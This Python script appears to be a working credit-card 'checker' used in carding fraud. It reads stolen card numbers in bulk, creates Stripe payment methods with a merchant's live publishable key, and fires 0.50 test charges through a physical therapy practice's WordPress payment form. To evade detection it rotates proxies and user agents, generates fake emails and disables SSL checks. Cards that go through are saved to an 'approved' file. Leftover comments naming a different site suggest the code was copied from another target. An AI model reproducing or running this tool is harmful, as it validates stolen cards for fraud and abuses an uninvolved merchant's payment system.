#!/usr/bin/env python3
import asyncio
import re
import json
import random
import aiohttp
import uuid
import warnings
import string
from fake_useragent import UserAgent
from colorama import init, Fore, Style

warnings.filterwarnings('ignore')
init(autoreset=True)

# ────────────────────────── helper functions ──────────────────────────

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

# ─────────────────────────── proxy parser ────────────────────────────

def parse_proxy_line(line: str) -> str or None:
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    
    parts = rest.split(':')
    if len(parts) == 4:
        host, port, user, pwd = parts
        auth = f"{user}:{pwd}"
        address = f"{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        address = f"{host}:{port}"
    elif '@' in rest:
        left, right = rest.split('@', 1)
        auth = left
        address = right
    else:
        return None

    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url

def load_proxies(file_path: str):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    except FileNotFoundError:
        print(f"{Fore.RED}❌ Proxy file not found: {file_path}")
    return proxies

# ──────────────────────── torr.ie auth logic ──────────────────────────

async def process_farmingdalephysicaltherapywest_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://farmingdalephysicaltherapywest.com'
    try:
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            email = generate_random_email()
            
            # Step 1: Create Payment Method via Stripe API
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random,
            }
            
            stripe_data = {
                'type': 'card',
                'billing_details[name]': 'Test User',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'payment_user_agent': 'stripe.js/c891fde8fc; stripe-js-v3/c891fde8fc; card-element',
                'key': 'pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'
            }

            async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url) as pm_resp:
                pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method ID'

            # Step 2: Submit Payment to Torr.ie
            farmingdalephysicaltherapywest_headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': site_url,
                'Referer': f'{site_url}/payments/',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest',
            }
            
            # Use list of tuples to handle multiple identical keys for 'wpfs-custom-input[]'
            farmingdalephysicaltherapywest_data = [
                ('action', 'wp_full_stripe_inline_payment_charge'),
                ('wpfs-form-name', 'default'),
                ('wpfs-form-get-parameters', ''),
                ('wpfs-custom-amount-unique', '0.50'),
                ('wpfs-custom-input[]', 'General Course'),
                ('wpfs-custom-input[]', '2026-06-01'),
                ('wpfs-custom-input[]', '0871234567'),
                ('wpfs-card-holder-email', email),
                ('wpfs-card-holder-name', 'Test User'),
                ('wpfs-stripe-payment-method-id', pm_id),
            ]

            async with session.post(f'{site_url}/wp-admin/admin-ajax.php', headers=farmingdalephysicaltherapywest_headers, data=farmingdalephysicaltherapywest_data, proxy=proxy_url) as farmingdalephysicaltherapywest_resp:
                try:
                    farmingdalephysicaltherapywest_json = await farmingdalephysicaltherapywest_resp.json()
                    result_message = farmingdalephysicaltherapywest_json.get('message', 'Unknown response from site')
                    # Success or specific decline messages
                    if farmingdalephysicaltherapywest_json.get('Payment Successful!') is True or 'successful' in result_message.lower():
                        return True, result_message
                    return False, result_message
                except:
                    text_resp = await farmingdalephysicaltherapywest_resp.text()
                    return False, f"Server Error: {text_resp[:100]}"

    except Exception as e:
        return False, f'System Error: {str(e)}'

# ─────────────────────── single card check ───────────────────────────

async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    
    if len(ano) == 4 and ano.startswith('20'):
        ano = ano[2:]
    card_data['exp_year'] = ano

    is_approved, response_msg = await process_farmingdalephysicaltherapywest_card(card_data, proxy_url=proxy)
    
    if is_approved:
        status = f'{Fore.GREEN}✅ $1Approved'
        is_live = True
    else:
        status = f'{Fore.RED}❌ Declined'
        is_live = False
    
    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'status': status,
        'response': response_msg,
        'is_live': is_live
    }

# ─────────────────────── mass checker ────────────────────────────────

async def mass_check(file_path, proxies=None, concurrency=5):
    if proxies is None:
        proxies = []
    cc_lines = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    cc_lines.append(line)
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File not found: {file_path}")
        return []
    
    if not cc_lines:
        print(f"{Fore.YELLOW}⚠️ No cards to check.")
        return []
    
    sem = asyncio.Semaphore(concurrency)
    results = []
    completed = 0

    async def worker(cc_line):
        nonlocal completed
        async with sem:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                return {'cc': cc_line, 'status': f'{Fore.RED}❌ Invalid', 'response': 'Invalid format', 'is_live': False}
            cc, mes, ano, cvv = parts
            proxy = random.choice(proxies) if proxies else None
            result = await check_card(cc, mes, ano, cvv, proxy=proxy)
            completed += 1
            print(f"{Fore.CYAN}[{completed}/{len(cc_lines)}] {result['cc']} → {result['status']}{Style.RESET_ALL} | Response: {result['response']}")
            if result['is_live']:
                with open("approved_farmingdalephysicaltherapywest.txt", "a", encoding="utf-8") as f:
                    f.write(result['cc'] + " | " + result['response'] + "\n")
            return result

    tasks = [asyncio.create_task(worker(line)) for line in cc_lines]
    results = await asyncio.gather(*tasks)
    
    approved = sum(1 for r in results if r['is_live'])
    declined = sum(1 for r in results if not r['is_live'] and 'Invalid' not in r['status'])
    
    print(f"\n{Fore.MAGENTA}📊 Mass Check Finished 📊{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Approved: {approved}")
    print(f"{Fore.RED}❌ Declined: {declined}")
    return results

# ──────────────────────── interactive menu ──────────────────────────

def print_menu():
    print(f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════╗
║     💳 farmingdalephysicaltherapywest 0.50 CHECKER 💳     ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}1.{Style.RESET_ALL} 🔍 Single Check
{Fore.YELLOW}2.{Style.RESET_ALL} 📁 Mass Check from File
{Fore.YELLOW}3.{Style.RESET_ALL} ⚙️  Proxy Settings
{Fore.YELLOW}4.{Style.RESET_ALL} ❌ Exit
""")

async def main():
    proxies = []
    concurrency = 5

    while True:
        print_menu()
        choice = input(f"{Fore.GREEN}👉 Select option: {Style.RESET_ALL}").strip()

        if choice == '1':
            cc_input = input(f"{Fore.YELLOW}🔸 Enter CC (format: cc|month|year|cvv): {Style.RESET_ALL}").strip()
            parts = cc_input.split('|')
            if len(parts) != 4:
                print(f"{Fore.RED}❌ Invalid format.{Style.RESET_ALL}")
                continue
            cc, mes, ano, cvv = parts
            proxy = random.choice(proxies) if proxies else None
            print(f"{Fore.CYAN}⏳ Checking...")
            result = await check_card(cc, mes, ano, cvv, proxy=proxy)
            print(f"\n{Fore.MAGENTA}--- RESULT ---{Style.RESET_ALL}")
            print(f"💳 Card: {result['cc']}")
            print(f"📌 Status: {result['status']}")
            print(f"💬 Response: {result['response']}\n")

        elif choice == '2':
            file_path = input(f"{Fore.YELLOW}🔸 Enter path to CC file: {Style.RESET_ALL}").strip()
            use_proxy = input(f"{Fore.YELLOW}🔹 Use proxies? (y/n): {Style.RESET_ALL}").strip().lower()
            if use_proxy == 'y' and not proxies:
                proxy_file = input(f"{Fore.YELLOW}🔸 Enter proxy file path: {Style.RESET_ALL}").strip()
                proxies = load_proxies(proxy_file)
            
            conc = input(f"{Fore.YELLOW}🔹 Concurrency (default 5): {Style.RESET_ALL}").strip()
            if conc.isdigit():
                concurrency = int(conc)
            
            print(f"{Fore.CYAN}⚡ Starting mass check...")
            await mass_check(file_path, proxies, concurrency)

        elif choice == '3':
            print(f"\n{Fore.MAGENTA}⚙️  Proxy Settings{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Load new proxy file")
            print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Clear proxies")
            proxy_choice = input(f"{Fore.GREEN}👉 Choose: {Style.RESET_ALL}").strip()
            if proxy_choice == '1':
                proxy_file = input(f"{Fore.YELLOW}🔸 Proxy file path: {Style.RESET_ALL}").strip()
                proxies = load_proxies(proxy_file)
                print(f"{Fore.GREEN}✅ Loaded {len(proxies)} proxies.")
            elif proxy_choice == '2':
                proxies = []
                print(f"{Fore.GREEN}✅ Proxies cleared.")

        elif choice == '4':
            print(f"{Fore.GREEN}👋 Goodbye!{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Stopped by user.")
